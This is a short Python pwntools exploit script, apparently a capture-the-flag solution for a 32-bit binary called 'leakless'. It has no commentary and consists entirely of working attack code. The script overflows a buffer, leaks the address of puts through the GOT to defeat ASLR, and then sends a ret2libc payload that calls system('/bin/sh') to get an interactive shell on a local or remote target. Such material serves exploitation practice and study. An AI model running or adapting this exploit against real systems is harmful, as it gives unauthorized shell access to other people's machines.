#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux', 'split-window', '-h']
elf = ELF('./leakless', checksec=False)

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = ELF('./libc.so.6', checksec=False)
else:
    r = elf.process()
    libc = ELF('/usr/lib32/libc.so.6', checksec=False)
    gdb.attach(r, 'b *0x080485f9')

payload  = 'A' * 76
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['feedme'])
payload += p32(elf.got['puts'])

r.sendline(payload)
leak = r.recv()
# print hex(u32(leak[0:4]))
libc.address = u32(leak[0:4]) - libc.symbols['puts']

payload  = 'A' * 76
payload += p32(libc.sym['system'])
payload += p32(libc.sym['exit'])
payload += p32(next(libc.search('/bin/sh')))

r.sendline(payload)

r.interactive()